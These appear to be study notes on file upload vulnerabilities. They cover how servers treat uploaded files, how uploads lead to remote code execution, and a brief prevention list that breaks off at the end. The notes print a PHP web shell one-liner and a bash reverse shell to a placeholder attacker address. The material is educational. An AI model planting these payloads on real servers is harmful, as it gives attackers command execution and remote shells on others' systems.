# File Upload Vulnerabilities

- File upload vulnerabilities are when a web server allows user to upload files to its filesystem without proper validation or sanitization. The validation should done for the file name, type, contents, size. Failing to do this results to remote code execution
- In some cases, the acts of uploading the files is in itself enough for the damage but some cases the attackers may involve a follow-up HTTP request for the file, typically to trigger its execution by the server

## How do web servers handle requests for static files

It can preconfigured mapping between extensions and MIME types
- If this file type is non-executable, such as an image or a static HTML page, the server may just send the file's contents to the client in an HTTP response.
- If the file type is executable, such as a PHP file, and the server is configured to execute files of this type, it will assign variables based on the headers and parameters in the HTTP request before running the script. The resulting output may then be sent to the client in an HTTP response.
- If the file type is executable, but the server is not configured to execute files of this type, it will generally respond with an error. However, in some cases, the contents of the file may still be served to the client as plain text. Such misconfigurations can occasionally be exploited to leak source code and other sensitive information. You can see an example of this in our information disclosure learning materials.

## Causes 

The File Uploads are done mainly to cause the remote code execution in the target web applications.f a web application allows the attacker to upload the server-side scripts (PHP, Java, or Python) and also configured to execute them as code this might create a web shell.
Remote code execution (RCE) is a critical vulnerability that allows attackers to execute arbitrary code on a target system from a remote location

- **Web Shell:** Command execution via uploaded script through browser. (HTTP interaction) 

Example:

```
<?php echo system($_GET['command']); ?>
```

- **Reverse Shell:** Full interactive shell via network where target connects back. (usually TCP interaction)

Example:

```
bash -i >& /dev/tcp/attacker-ip/4444 0>&1
```

## Prevention

- Sanitization
- Blacklisting
- Never trust user input
- Canonicalize then check
- Prefer allowlists / mapping 
- Reject dangerous semantics — d


